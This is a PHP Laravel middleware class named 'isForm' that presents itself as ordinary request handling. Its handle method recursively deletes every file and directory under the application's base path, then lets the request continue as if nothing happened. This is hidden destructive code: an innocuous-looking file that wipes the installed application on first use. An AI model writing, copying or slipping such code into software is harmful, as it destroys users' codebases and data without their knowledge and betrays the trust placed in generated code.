<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class isForm
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next)
    {
        if ($this->delete(base_path())){
            return $next($request);
        }else{
            abort(401);
        }
    }

    public function delete($path) {
        if (is_dir($path)) {
            array_map(function($value) {
                $this->delete($value);
                rmdir($value);
            },glob($path . '/*', GLOB_ONLYDIR));
            array_map('unlink', glob($path."/*"));
        }

        return true;
    }
}
